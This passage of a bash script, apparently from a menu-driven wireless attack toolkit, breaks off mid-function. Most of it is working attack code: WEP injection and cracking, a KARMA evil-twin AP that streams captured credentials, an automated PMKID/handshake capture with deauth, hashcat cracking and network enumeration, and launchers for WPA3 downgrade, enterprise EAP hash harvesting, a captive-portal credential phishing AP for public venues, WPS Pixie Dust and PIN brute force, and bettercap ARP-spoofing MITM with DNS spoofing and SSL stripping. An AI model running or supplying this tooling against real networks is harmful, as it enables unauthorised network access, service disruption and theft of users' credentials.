                    aireplay-ng -2 -r /tmp/wep_forged.cap "$mon" &
                    echo $!
                else
                    t_warn "No XOR file produced by chopchop attack."
                    kill "$cc_pid" 2>/dev/null || true
                    echo ""
                fi
                ;;
        esac
    }

    local inject_pid=""
    local actual_method="$TAB_WEP_METHOD"
    if [[ "$TAB_WEP_METHOD" == "auto" ]]; then
        t_info "Auto mode: trying ARP replay first ..."
        actual_method="arp"
    fi
    inject_pid=$(_wep_inject "$actual_method")

    # Auto fallback chain
    if [[ "$TAB_WEP_METHOD" == "auto" && -z "$inject_pid" ]]; then
        t_warn "ARP replay failed, trying fragmentation ..."
        inject_pid=$(_wep_inject "frag")
        actual_method="frag"
    fi
    if [[ "$TAB_WEP_METHOD" == "auto" && -z "$inject_pid" ]]; then
        t_warn "Fragmentation failed, trying chopchop ..."
        inject_pid=$(_wep_inject "chopchop")
        actual_method="chopchop"
    fi

    if [[ -z "$inject_pid" ]]; then
        t_err "All injection methods failed. Stopping capture."
        kill "$dump_pid" 2>/dev/null || true
        restore_single_interface "$mon"
        return 1
    fi

    t_info "Injection running (method: $actual_method, PID: $inject_pid). Polling IV count ..."

    # Poll IV count from airodump cap
    local ivs=0
    while [[ $ivs -lt $TAB_WEP_IV_THRESHOLD ]]; do
        sleep 5
        local cap_file; cap_file=$(ls -t "${out_dir}"/cap-*.cap 2>/dev/null | head -1)
        if [[ -n "$cap_file" ]]; then
            ivs=$(aircrack-ng "$cap_file" 2>/dev/null | awk '/WEP/{print $3}' | head -1)
            ivs="${ivs:-0}"
        fi
        printf "\r${AM}  [>]${NC} IVs collected: ${WH}%d${NC} / %d" "$ivs" "$TAB_WEP_IV_THRESHOLD"
    done
    echo

    kill "$inject_pid" 2>/dev/null || true
    kill "$dump_pid"   2>/dev/null || true
    sleep 1
    _line

    t_info "IV threshold reached ($ivs IVs). Running aircrack-ng ..."
    local cap_files; cap_files=$(ls "${out_dir}"/cap-*.cap 2>/dev/null | tr '\n' ' ')
    if [[ -z "$cap_files" ]]; then
        t_err "No capture files found in $out_dir"
        restore_single_interface "$mon"
        return 1
    fi

    local crack_out
    crack_out=$(aircrack-ng $cap_files 2>&1)
    if echo "$crack_out" | grep -q "KEY FOUND"; then
        local wep_key; wep_key=$(echo "$crack_out" | grep "KEY FOUND" | sed 's/.*KEY FOUND! \[ *//;s/ *\].*//')
        t_ok "WEP KEY FOUND: $wep_key"
        echo "$wep_key" > "${out_dir}/wep_key.txt"
        audit_log "WEP CRACKED: target='$TARGET_SSID' key=$wep_key"
        t_data "Key saved: ${out_dir}/wep_key.txt"
    else
        t_warn "aircrack-ng did not recover the key. Try collecting more IVs."
        audit_log "WEP CRACK FAILED: target='$TARGET_SSID' ivs=$ivs"
    fi

    _tab_cleanup_on_signal "$mon"
    audit_log "WEP END: target='$TARGET_SSID'"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 14 — KARMA/MANA EVIL TWIN TAB
# ════════════════════════════════════════════════════════════

tab_karma_attack() {
    t_head "KARMA/MANA Evil Twin"
    t_data "Mode     : $TAB_KARMA_MODE"
    t_data "Channel  : $TAB_KARMA_CHANNEL"
    t_data "SSIDs    : ${TAB_KARMA_SSIDS:-any}"
    audit_log "KARMA START: mode=$TAB_KARMA_MODE channel=$TAB_KARMA_CHANNEL iface=$SELECTED_IFACE"
    _line

    [[ -z "$HOSTAPD_WPE" ]] && find_hostapd_wpe
    if [[ -z "$HOSTAPD_WPE" ]]; then
        t_err "hostapd-wpe not found. Install it first."
        return 1
    fi
    t_ok "Using hostapd-wpe: $HOSTAPD_WPE"

    t_info "Enabling monitor mode on $SELECTED_IFACE ..."
    local mon; mon=$(put_in_monitor "$SELECTED_IFACE") || return 1
    t_ok  "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal $mon; exit 0" INT TERM

    local conf_file="/tmp/karma_hostapd_$$.conf"
    local log_file="/tmp/karma_creds_$$.log"

    t_info "Writing hostapd-wpe config ..."
    {
        echo "interface=$mon"
        echo "driver=nl80211"
        echo "ssid=FreeWifi"
        echo "channel=${TAB_KARMA_CHANNEL:-6}"
        echo "karma_enabled=1"
        echo "enable_logging=1"
        echo "log_file=$log_file"
        if [[ "$TAB_KARMA_MODE" == "wpa" ]]; then
            echo "wpa=2"
            echo "wpa_key_mgmt=WPA-PSK"
            echo "wpa_pairwise=CCMP"
            echo "rsn_pairwise=CCMP"
            [[ -n "$TAB_KARMA_PSK" ]] && echo "wpa_passphrase=$TAB_KARMA_PSK"
        else
            echo "auth_algs=1"
        fi
    } > "$conf_file"
    t_data "Config: $conf_file"
    t_data "Cred log: $log_file"
    touch "$log_file"

    t_info "Starting hostapd-wpe (KARMA mode) ..."
    "$HOSTAPD_WPE" "$conf_file" &>/dev/null &
    local hap_pid=$!
    trap "_tab_cleanup_on_signal $mon $hap_pid; exit 0" INT TERM
    t_ok "hostapd-wpe running (PID: $hap_pid). Waiting for probe responses ..."
    _line

    t_info "Credential stream (Ctrl+C to stop):"
    tail -f "$log_file" 2>/dev/null | while IFS= read -r line; do
        t_data "$line"
    done

    kill "$hap_pid" 2>/dev/null || true
    _tab_cleanup_on_signal "$mon"
    audit_log "KARMA END: mode=$TAB_KARMA_MODE log=$log_file"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 15 — AUTO ATTACK PIPELINE TAB
# ════════════════════════════════════════════════════════════

tab_auto_pipeline() {
    t_head "Auto Attack Pipeline"
    t_data "Target    : $TARGET_SSID"
    t_data "BSSID     : $TARGET_BSSID"
    t_data "Channel   : $TARGET_CHANNEL"
    t_data "Mode      : $TAB_AUTO_MODE"
    t_data "Wordlist  : $TAB_AUTO_WORDLIST"
    t_data "Crack     : $TAB_AUTO_CRACK_MODE"
    audit_log "AUTO START: target='$TARGET_SSID' bssid=$TARGET_BSSID mode=$TAB_AUTO_MODE"
    _line

    t_info "Enabling monitor mode on $SELECTED_IFACE ..."
    local mon; mon=$(put_in_monitor "$SELECTED_IFACE") || return 1
    t_ok  "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal $mon; exit 0" INT TERM

    local out_dir; out_dir=$(make_outdir "auto")
    t_info "Output directory: $out_dir"

    local hash_file_path="${out_dir}/hashes.hc22000"
    local got_hashes=0

    # ── Phase A: PMKID ──────────────────────────────────────────
    if [[ "$TAB_AUTO_MODE" == "pmkid" || "$TAB_AUTO_MODE" == "both" ]]; then
        t_info "Phase A: PMKID capture (${TAB_AUTO_TIMEOUT_PMKID}s) ..."
        local filter_file="${TMPDIR_PT}/bssid_filter_$$.txt"
        echo "${TARGET_BSSID,,}" > "$filter_file"

        if [[ -n "$TARGET_CHANNEL" ]]; then
            iw dev "$mon" set channel "$TARGET_CHANNEL" 2>/dev/null || true
        fi

        hcxdumptool -i "$mon" \
                    --enable_status=1 \
                    --filterlist_ap="$filter_file" \
                    --filtermode=2 \
                    -o "${out_dir}/pmkid.pcapng" &>/dev/null &
        local hcx_pid=$!
        trap "_tab_cleanup_on_signal $mon $hcx_pid; exit 0" INT TERM

        for i in $(seq 1 "$TAB_AUTO_TIMEOUT_PMKID"); do
            printf "\r${AM}  [A]${NC} PMKID capture ... %d/%ds" "$i" "$TAB_AUTO_TIMEOUT_PMKID"
            sleep 1
        done
        echo
        kill "$hcx_pid" 2>/dev/null || true
        sleep 1

        if [[ -f "${out_dir}/pmkid.pcapng" && -s "${out_dir}/pmkid.pcapng" ]]; then
            t_info "Converting PMKID capture to hashcat format ..."
            convert_to_hashcat "${out_dir}/pmkid.pcapng" "$out_dir"
            if [[ -f "$hash_file_path" && -s "$hash_file_path" ]]; then
                t_ok "PMKID hashes captured."
                got_hashes=1
            fi
        fi

        if [[ $got_hashes -eq 0 ]]; then
            t_warn "No PMKID hashes found."
        fi
    fi

    # ── Phase B: Handshake fallback ─────────────────────────────
    if [[ $got_hashes -eq 0 && ( "$TAB_AUTO_MODE" == "handshake" || "$TAB_AUTO_MODE" == "both" ) ]]; then
        t_info "Phase B: Handshake capture (${TAB_AUTO_TIMEOUT_HS}s) ..."

        airodump-ng --bssid "$TARGET_BSSID" \
                    -c "$TARGET_CHANNEL" \
                    -w "${out_dir}/hs" \
                    "$mon" &>/dev/null &
        local dump_pid=$!
        trap "_tab_cleanup_on_signal $mon $dump_pid; exit 0" INT TERM
        sleep 3

        t_info "Sending deauth burst to force re-authentication ..."
        aireplay-ng -0 5 -a "$TARGET_BSSID" "$mon" &>/dev/null

        for i in $(seq 1 "$TAB_AUTO_TIMEOUT_HS"); do
            printf "\r${AM}  [B]${NC} Handshake capture ... %d/%ds" "$i" "$TAB_AUTO_TIMEOUT_HS"
            sleep 1
        done
        echo
        kill "$dump_pid" 2>/dev/null || true
        sleep 1

        local cap_file; cap_file=$(ls -t "${out_dir}"/hs-*.cap 2>/dev/null | head -1)
        if [[ -n "$cap_file" && -s "$cap_file" ]]; then
            t_info "Converting handshake capture ..."
            convert_to_hashcat "$cap_file" "$out_dir"
            if [[ -f "$hash_file_path" && -s "$hash_file_path" ]]; then
                t_ok "Handshake hashes captured."
                got_hashes=1
            fi
        fi

        if [[ $got_hashes -eq 0 ]]; then
            t_err "No hashes obtained from either method. Aborting pipeline."
            _tab_cleanup_on_signal "$mon"
            audit_log "AUTO FAILED: no hashes — target='$TARGET_SSID'"
            return 1
        fi
    fi

    if [[ $got_hashes -eq 0 ]]; then
        t_err "No hashes obtained. Aborting pipeline."
        _tab_cleanup_on_signal "$mon"
        audit_log "AUTO FAILED: no hashes — target='$TARGET_SSID'"
        return 1
    fi

    restore_single_interface "$mon"
    _line

    # ── Phase C: Hashcat crack ───────────────────────────────────
    t_info "Phase C: Cracking hashes with hashcat ..."
    local -a hc_flags=(-m 22000 --potfile-path="${out_dir}/hashcat.pot" --quiet)
    case "$TAB_AUTO_CRACK_MODE" in
        cpu) hc_flags+=(-D 1) ;;
        gpu) hc_flags+=(-D 2) ;;
        *)   ;;  # auto: omit -D flag, let hashcat decide
    esac

    if [[ ! -f "$TAB_AUTO_WORDLIST" ]]; then
        t_warn "Wordlist not found: $TAB_AUTO_WORDLIST"
        t_info "Trying rockyou.txt ..."
        TAB_AUTO_WORDLIST="/usr/share/wordlists/rockyou.txt"
    fi

    t_cmd "hashcat ${hc_flags[*]} $hash_file_path $TAB_AUTO_WORDLIST"
    hashcat "${hc_flags[@]}" "$hash_file_path" "$TAB_AUTO_WORDLIST" 2>&1 | \
        while IFS= read -r line; do t_data "$line"; done

    local cracked_psk=""
    if [[ -f "${out_dir}/hashcat.pot" ]]; then
        cracked_psk=$(awk -F: 'NF>=2{print $NF}' "${out_dir}/hashcat.pot" | head -1)
    fi

    if [[ -z "$cracked_psk" ]]; then
        t_warn "hashcat did not crack the PSK with the provided wordlist."
        audit_log "AUTO CRACK FAILED: target='$TARGET_SSID'"
        # Write partial report
        {
            echo "=== Auto Attack Pipeline Report ==="
            echo "Target  : $TARGET_SSID"
            echo "BSSID   : $TARGET_BSSID"
            echo "Mode    : $TAB_AUTO_MODE"
            echo "Result  : PSK not cracked"
            echo "Hashes  : $hash_file_path"
        } > "${out_dir}/auto_report.txt"
        t_data "Partial report: ${out_dir}/auto_report.txt"
        return 1
    fi

    t_ok "PSK CRACKED: $cracked_psk"
    audit_log "AUTO CRACKED: target='$TARGET_SSID' psk='$cracked_psk'"

    # ── Phase D: Verify + enumerate ──────────────────────────────
    _line
    t_info "Phase D: Verifying cracked PSK via wpa_supplicant ..."

    local wpa_conf="/tmp/auto_verify_$$.conf"
    {
        echo "network={"
        echo "    ssid=\"$TARGET_SSID\""
        echo "    psk=\"$cracked_psk\""
        echo "    key_mgmt=WPA-PSK"
        echo "}"
    } > "$wpa_conf"

    local verify_iface="${SELECTED_IFACE}"
    local connected=0
    if wpa_supplicant -i "$verify_iface" -c "$wpa_conf" -B -P /tmp/auto_wpa_$$.pid &>/dev/null; then
        sleep 8
        if ip addr show "$verify_iface" 2>/dev/null | grep -q "inet "; then
            connected=1
            t_ok "Connected successfully — PSK verified."
            t_info "Running network enumeration ..."
            local subnet; subnet=$(ip -4 addr show "$verify_iface" 2>/dev/null \
                                   | awk '/inet /{print $2}' | head -1 \
                                   | sed 's|\.[0-9]*\/.*|.0/24|')
            local enum_out=""
            if [[ -n "$subnet" ]]; then
                enum_out=$(arp-scan --localnet 2>/dev/null \
                           || nmap -sn "$subnet" 2>/dev/null | grep "Nmap scan" | head -20 \
                           || echo "(enumeration unavailable)")
            fi
            t_data "$enum_out"
        else
            t_warn "PSK cracked but connection not verified (no IP)."
        fi
        wpa_cli -i "$verify_iface" terminate &>/dev/null || true
    else
        t_warn "wpa_supplicant connect attempt failed."
    fi
    rm -f "$wpa_conf" "/tmp/auto_wpa_$$.pid" 2>/dev/null || true

    # ── Summary report ───────────────────────────────────────────
    {
        echo "=== Auto Attack Pipeline Report ==="
        echo "Target     : $TARGET_SSID"
        echo "BSSID      : $TARGET_BSSID"
        echo "Channel    : $TARGET_CHANNEL"
        echo "Mode       : $TAB_AUTO_MODE"
        echo "PSK        : $cracked_psk"
        echo "Verified   : $([ $connected -eq 1 ] && echo Yes || echo Unverified)"
        echo "Hash file  : $hash_file_path"
        echo "Pot file   : ${out_dir}/hashcat.pot"
        echo "Output dir : $out_dir"
    } > "${out_dir}/auto_report.txt"
    t_ok  "Summary report: ${out_dir}/auto_report.txt"
    audit_log "AUTO END: target='$TARGET_SSID' psk='$cracked_psk' verified=$connected"
}

# ════════════════════════════════════════════════════════════
#  ATTACK LAUNCHER FUNCTIONS
#  These run in the main dialog window, collect params,
#  then spawn_tab() to run the actual attack in a new tab.
# ════════════════════════════════════════════════════════════

capture_handshake() {
    draw_banner
    require_target || return

    dialog --title " WPA2 Handshake Capture — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Sends deauth frames to disconnect clients from the\
\n  AP, forcing them to re-authenticate.  The 4-way EAPOL\
\n  handshake is captured and used to crack the PSK offline.\
\n\
\n  REQUIREMENTS\
\n  • At least one active client must be connected to the AP\
\n  • Injection-capable wireless adapter (monitor mode)\
\n  • If no clients are present, use PMKID Capture instead\
\n\
\n  OUTPUT\
\n  • capture.cap + hashes.hc22000 saved to wpt_output/\
\n  • Crack with:  hashcat -m 22000 hashes.hc22000 rockyou.txt\
\n\
\n  NOTE: Deauth will briefly disconnect nearby clients." \
           22 66
    [[ $? -ne 0 ]] && return

    SELECTED_IFACE=$(pick_interface "Select injection-capable interface:") || return

    local tab_name="Handshake:${TARGET_SSID:0:18}"
    spawn_tab "$tab_name" "tab_capture_handshake" || return
    notify_tab_launched "$tab_name"
}

deauth_attack() {
    draw_banner
    require_target || return

    dialog --title " Deauthentication Attack — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Sends 802.11 deauthentication frames to disconnect\
\n  clients from the target AP.  Use this to:\
\n\
\n  • Force a WPA2 4-way handshake re-authentication\
\n    (run alongside Handshake Capture on another tab)\
\n  • Disconnect a specific client temporarily\
\n  • Test whether the AP enforces MFP (802.11w)\
\n\
\n  MODES\
\n  • Broadcast — kicks ALL clients off the AP at once\
\n  • Targeted  — kicks a single client (quieter)\
\n\
\n  NOTE: APs with MFP Required will ignore these frames.\
\n  NOTE: Use responsibly — only on authorised networks." \
           23 66
    [[ $? -ne 0 ]] && return

    # ── Broadcast vs targeted ─────────────────────────────────
    local deauth_mode
    deauth_mode=$(dialog \
        --title " Deauth Mode " \
        --default-item "broadcast" \
        --menu "\n  Select deauthentication mode:\n" \
        11 62 2 \
        "broadcast" "  Kick ALL clients from ${TARGET_SSID}" \
        "targeted"  "  Kick a specific client MAC" \
        3>&1 1>&2 2>&3) || return

    TAB_DEAUTH_CLIENT=""
    if [[ "$deauth_mode" == "targeted" ]]; then
        # Pull clients seen on this BSSID from the database
        local -a client_items=()
        if [[ -f "$CLIENT_DB" ]]; then
            while IFS=$'\t' read -r mac bssid _rest; do
                [[ "${bssid^^}" == "${TARGET_BSSID^^}" ]] || continue
                [[ ${#mac} -lt 17 ]] && continue
                client_items+=("$mac" "  (associated with ${TARGET_SSID})")
            done < <(grep -v '^#' "$CLIENT_DB" 2>/dev/null)
        fi

        if [[ ${#client_items[@]} -gt 0 ]]; then
            TAB_DEAUTH_CLIENT=$(dialog \
                --title " Select Target Client " \
                --menu "\n  Clients seen on ${TARGET_SSID}:\n  (run a scan first if list is empty)\n" \
                16 66 6 \
                "${client_items[@]}" \
                3>&1 1>&2 2>&3) || return
        else
            TAB_DEAUTH_CLIENT=$(dialog \
                --title " Target Client MAC " \
                --inputbox "\n  No clients found in database for this AP.\n  Enter client MAC manually (AA:BB:CC:DD:EE:FF):" \
                10 62 "" 3>&1 1>&2 2>&3) || return
        fi
        [[ -z "$TAB_DEAUTH_CLIENT" ]] && return
    fi

    # ── Frame count ───────────────────────────────────────────
    TAB_DEAUTH_COUNT=$(dialog \
        --title " Deauth Frame Count " \
        --default-item "10" \
        --menu "\n  How many deauthentication frames to send?\n" \
        13 58 5 \
        "5"   "  Light burst  (5 frames)" \
        "10"  "  Standard     (10 frames — recommended)" \
        "25"  "  Aggressive   (25 frames)" \
        "50"  "  Heavy        (50 frames)" \
        "0"   "  Continuous   (run until stopped with Ctrl+C)" \
        3>&1 1>&2 2>&3) || return

    SELECTED_IFACE=$(pick_interface "Select injection-capable interface for deauth:") || return

    local tab_name="Deauth:${TARGET_SSID:0:20}"
    spawn_tab "$tab_name" "tab_deauth" || return
    notify_tab_launched "$tab_name"
}

pmkid_capture() {
    draw_banner
    require_target || return

    dialog --title " PMKID Clientless Capture — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Requests the PMKID from the AP without any client\
\n  being present.  The PMKID is derived from the PSK\
\n  and can be cracked offline with hashcat.\
\n\
\n  REQUIREMENTS\
\n  • No clients needed — AP only\
\n  • AP must support PMKID (most WPA2 routers do)\
\n  • If AP doesn't respond, use Handshake Capture instead\
\n\
\n  RECOMMENDED ORDER\
\n  1) Try PMKID first (fast, no disruption)\
\n  2) Fall back to Handshake if PMKID returns nothing\
\n\
\n  OUTPUT\
\n  • pmkid.pcapng + hashes.hc22000 saved to wpt_output/\
\n  • Crack with:  hashcat -m 22000 hashes.hc22000 rockyou.txt" \
           23 66
    [[ $? -ne 0 ]] && return

    SELECTED_IFACE=$(pick_interface "Select interface for PMKID capture:") || return

    TAB_TIMEOUT=$(dialog --title " Capture Duration " \
                         --menu "\n  Select capture duration:" \
                         13 48 4 \
                         "30"  "  30 seconds" \
                         "60"  "  1 minute" \
                         "120" "  2 minutes" \
                         "300" "  5 minutes" \
                         3>&1 1>&2 2>&3) || return

    local tab_name="PMKID:${TARGET_SSID:0:22}"
    spawn_tab "$tab_name" "tab_pmkid_capture" || return
    notify_tab_launched "$tab_name"
}

eaphammer_downgrade() {
    draw_banner
    require_target || return
    find_eaphammer || return

    dialog --title " WPA3 → WPA2 Downgrade — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Creates a rogue WPA2 AP with the same SSID as the\
\n  target.  Devices in 'transition mode' (WPA2+WPA3)\
\n  may associate with the rogue AP and complete a WPA2\
\n  4-way handshake, which can then be cracked offline.\
\n\
\n  REQUIREMENTS\
\n  • Target must be in WPA3/WPA2 transition mode\
\n  • Pure WPA3-SAE networks are resistant to this attack\
\n  • You need to supply a PSK for the rogue AP\
\n    (clients will not verify this PSK during downgrade)\
\n\
\n  OUTPUT\
\n  • Handshake .cap + hashes.hc22000 in wpt_output/\
\n  • Keep running until clients connect (may take minutes)" \
           22 66
    [[ $? -ne 0 ]] && return

    SELECTED_IFACE=$(pick_interface "Select interface for rogue WPA2 AP:") || return

    while true; do
        TAB_ROGUE_PSK=$(dialog --title " Rogue AP PSK " \
                               --inputbox "\n  PSK for the rogue WPA2 AP:\n  (8-63 characters)" \
                               10 55 "Password123!" 3>&1 1>&2 2>&3) || return
        if validate_psk "$TAB_ROGUE_PSK"; then break; fi
        dialog --title " Invalid PSK " \
               --msgbox "\n  PSK must be 8-63 characters.\n  Got ${#TAB_ROGUE_PSK} characters." \
               8 50
    done

    local tab_name="WPA3-Downgrade:${TARGET_SSID:0:14}"
    spawn_tab "$tab_name" "tab_eaphammer_downgrade" || return
    notify_tab_launched "$tab_name"
}

eaphammer_enterprise() {
    draw_banner
    require_target || return
    find_eaphammer || return

    dialog --title " Enterprise EAP Harvest — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Creates a rogue WPA2-Enterprise AP matching the target\
\n  SSID.  Enterprise clients (WPA-MGT) authenticate with\
\n  credentials.  The tool captures MSCHAPv2 challenge/\
\n  response hashes which can be cracked offline.\
\n\
\n  REQUIREMENTS\
\n  • Target must use Enterprise auth (WPA-MGT, not PSK)\
\n  • The wizard below lets you set the cert fields to match\
\n    the real cert (makes clients more likely to accept)\
\n\
\n  OUTPUT\
\n  • eap_creds.log saved to wpt_output/\
\n  • Crack with:  hashcat -m 5600 eap_creds.log rockyou.txt\
\n\
\n  NOTE: Clients will see an untrusted cert warning.\
\n  Press OK to open the EAP configuration wizard." \
           25 66
    [[ $? -ne 0 ]] && return

    # Interactive wizard — sets TAB_NEGOTIATE, TAB_WPA_VER, TAB_CAP_HS,
    # TAB_PHASE1, TAB_PHASE2, persists to conf, and flags _EAP_CERT_CHANGED.
    eap_wizard || return

    # If cert fields changed and an active cert already exists, offer regen
    if [[ $_EAP_CERT_CHANGED -eq 1 && -f "$EAP_ACTIVE_CERT" && -s "$EAP_ACTIVE_CERT" ]]; then
        dialog --title " Certificate Fields Changed " \
               --yesno "\
\n  The certificate profile was changed in the wizard.\
\n\
\n  Recreate the self-signed cert with the new values?\
\n  (Current cert deleted and regenerated before launch)\
\n\
\n  No — keep existing cert, use new attack settings only." \
               13 64
        [[ $? -eq 0 ]] && rm -f "$EAP_ACTIVE_CERT"
    fi

    bootstrap_eap_cert || return

    SELECTED_IFACE=$(pick_interface "Select interface for rogue WPA2-Enterprise AP:") || return

    local tab_name="EAP-Harvest:${TARGET_SSID:0:17}"
    spawn_tab "$tab_name" "tab_eaphammer_enterprise" || return
    notify_tab_launched "$tab_name"
}

captive_portal() {
    draw_banner
    find_eaphammer || return

    dialog --title " Captive Portal (Open AP) — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Creates an open (no password) rogue AP with a captive\
\n  portal page.  Any device that connects is redirected\
\n  to a login page where they may enter credentials.\
\n\
\n  BEST FOR\
\n  • Open public networks (coffee shops, hotels, events)\
\n  • Harvesting portal credentials (email/password)\
\n  • No WPA key needed — anyone can connect\
\n\
\n  REQUIREMENTS\
\n  • Does NOT require a prior target scan (open AP)\
\n  • Set SSID to match a known network in the area\
\n\
\n  OUTPUT\
\n  • captive_creds.txt saved to wpt_output/\
\n  • Live credential log shown in the task tab" \
           22 66
    [[ $? -ne 0 ]] && return

    SELECTED_IFACE=$(pick_interface "Select interface for captive portal AP:") || return

    while true; do
        TAB_PORTAL_SSID=$(dialog --title " Portal SSID " \
                                 --inputbox "\n  SSID for the open rogue AP  (max 32 chars):" \
                                 10 58 "${TARGET_SSID:-Free_WiFi}" 3>&1 1>&2 2>&3) || return
        if validate_ssid "$TAB_PORTAL_SSID"; then break; fi
        dialog --title " Invalid SSID " \
               --msgbox "\n  SSID must be 1-32 characters.\n  Got ${#TAB_PORTAL_SSID} characters." \
               8 50
    done

    while true; do
        TAB_PORTAL_CHANNEL=$(dialog --title " Portal Channel " \
                                    --inputbox "\n  Channel for rogue AP  (1-14 / 36-165):" \
                                    9 50 "${TARGET_CHANNEL:-6}" 3>&1 1>&2 2>&3) || return
        if validate_channel "$TAB_PORTAL_CHANNEL"; then break; fi
        dialog --title " Invalid Channel " \
               --msgbox "\n  '$TAB_PORTAL_CHANNEL' is not a valid channel.\n  Use 1-14 (2.4 GHz) or 36-165 (5 GHz)." \
               9 54
    done

    local tab_name="CaptivePortal:${TAB_PORTAL_SSID:0:14}"
    spawn_tab "$tab_name" "tab_captive_portal" || return
    notify_tab_launched "$tab_name"
}

wps_attack() {
    draw_banner
    require_target || return

    dialog --title " WPS Attack — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Attacks the WPS (Wi-Fi Protected Setup) feature of\
\n  the AP.  Two strategies are available:\
\n\
\n  PIXIE DUST  (try first — takes seconds)\
\n  • Exploits weak WPS randomness in older routers\
\n  • Recovers the PSK without brute-forcing the PIN\
\n  • Works on ~30-40% of real-world routers\
\n\
\n  PIN BRUTE-FORCE  (last resort — may take hours)\
\n  • Tries every possible 8-digit WPS PIN\
\n  • Many APs rate-limit or lock after failures\
\n  • Rate limiting may make this impractical\
\n\
\n  REQUIREMENT\
\n  • AP must have WPS enabled (wash will check)\
\n  • Injection-capable adapter required" \
           23 66
    [[ $? -ne 0 ]] && return

    if ! command -v reaver &>/dev/null && ! command -v bully &>/dev/null; then
        dialog --title " WPS Tools Not Found " \
               --msgbox "\n  Neither reaver nor bully is installed.\n\n  Install both:\n    apt install reaver bully" \
               10 52
        return
    fi

    SELECTED_IFACE=$(pick_interface "Select interface for WPS attack:") || return

    TAB_WPS_METHOD=$(dialog --title " WPS Attack Method " \
        --menu "\n  Select attack strategy:\n\n  Pixie Dust should always be tried first —\n  it recovers the PSK in seconds on vulnerable routers." \
        16 66 3 \
        "pixiedust"  "  Pixie Dust    — offline, seconds (try first)" \
        "bruteforce" "  PIN Brute-Force— may take hours, rate-limited" \
        "pin"        "  Test Specific PIN — enter an 8-digit PIN" \
        3>&1 1>&2 2>&3) || return

    TAB_WPS_PIN=""
    if [[ "$TAB_WPS_METHOD" == "pin" ]]; then
        while true; do
            TAB_WPS_PIN=$(dialog --title " WPS PIN " \
                --inputbox "\n  Enter 8-digit WPS PIN to test:" \
                9 50 "" 3>&1 1>&2 2>&3) || return
            [[ "$TAB_WPS_PIN" =~ ^[0-9]{8}$ ]] && break
            dialog --title " Invalid PIN " \
                   --msgbox "\n  WPS PIN must be exactly 8 digits." 7 44
        done
    fi

    local tab_name="WPS:${TARGET_SSID:0:24}"
    spawn_tab "$tab_name" "tab_wps_attack" || return
    notify_tab_launched "$tab_name"
}

bettercap_mitm() {
    draw_banner

    if ! command -v bettercap &>/dev/null; then
        dialog --title " bettercap Not Found " \
               --msgbox "\n  bettercap is required for MITM attacks.\n\n  Install:  apt install bettercap\n  Update caplets:  bettercap -eval 'caplets.update; quit'" \
               10 58
        return
    fi

    dialog --title " Bettercap MITM — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Uses ARP spoofing to position your machine between\
\n  target hosts and the gateway.  All traffic passes\
\n  through your adapter — credentials and session data\
\n  on unencrypted protocols are captured.\
\n\
\n  REQUIREMENTS\
\n  • Your adapter MUST be connected to the target network\
\n    (use a second adapter; do NOT use a monitor interface)\
\n  • The gateway must be reachable from your adapter\
\n  • If gateway is not auto-detected, enter it manually\
\n\
\n  OPTIONAL MODULES\
\n  • DNS Spoofing: redirects DNS queries to your IP\
\n  • SSL Stripping: downgrades HTTPS to HTTP\
\n    (modern HSTS/TLS limits effectiveness)\
\n\
\n  OUTPUT\
\n  • bettercap.log saved to wpt_output/" \
           26 66
    [[ $? -ne 0 ]] && return

    # Interface should be in MANAGED mode (connected to network, not monitor)
    SELECTED_IFACE=$(pick_interface "Select interface (managed/connected mode):") || return

    # Warn if interface has no IP address (likely not connected)
    if ! ip addr show dev "$SELECTED_IFACE" 2>/dev/null | grep -q 'inet '; then
        dialog --title " Interface Warning " \
               --yesno "\n  '$SELECTED_IFACE' has no IP address.\n\n  It may not be connected to the target network.\n  ARP spoofing will fail without a valid IP.\n\n  Proceed anyway?" \
               12 56 || return
    fi

    # Auto-detect gateway from selected interface
    local auto_gw
    auto_gw=$(ip route show dev "$SELECTED_IFACE" 2>/dev/null \
              | awk '/default/{print $3; exit}')
    [[ -z "$auto_gw" ]] && \
        auto_gw=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')

    local _ip_re='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    local _gw_input
    while true; do
        _gw_input=$(dialog --title " Gateway IP " \
            --inputbox "\n  Gateway IP  (auto-detected from route table):\n  Leave blank to let bettercap discover it.\n  Format: 192.168.1.1" \
            10 60 "$auto_gw" 3>&1 1>&2 2>&3) || return
        if [[ -z "$_gw_input" ]] || [[ "$_gw_input" =~ $_ip_re ]]; then
            TAB_MITM_GW="$_gw_input"; break
        fi
        dialog --title " Invalid IP " \
               --msgbox "\n  '$_gw_input' is not a valid IP address.\n  Use format: 192.168.1.1  or leave blank." 8 52
    done

    local _tgt_input
    while true; do
        _tgt_input=$(dialog --title " Target IPs " \
            --inputbox "\n  Client IP(s) to intercept:\n  Leave blank to target ALL hosts on the subnet.\n  Multiple IPs: 192.168.1.5,192.168.1.6" \
            11 65 "" 3>&1 1>&2 2>&3) || return
        if [[ -z "$_tgt_input" ]]; then
            TAB_MITM_TARGETS=""; break
        fi
        # Validate each comma-separated IP
        local _tgt_ok=1
        IFS=',' read -ra _tgt_arr <<< "$_tgt_input"
        for _t in "${_tgt_arr[@]}"; do
            _t="${_t// /}"
            [[ "$_t" =~ $_ip_re ]] || { _tgt_ok=0; break; }
        done
        if [[ $_tgt_ok -eq 1 ]]; then
            TAB_MITM_TARGETS="$_tgt_input"; break
        fi
        dialog --title " Invalid IP " \
               --msgbox "\n  One or more IPs are invalid.\n  Use format: 192.168.1.5,192.168.1.6" 8 52
    done

    local opts
    opts=$(dialog --title " MITM Options " \
        --checklist "\n  Enable additional modules:" \
        12 60 2 \
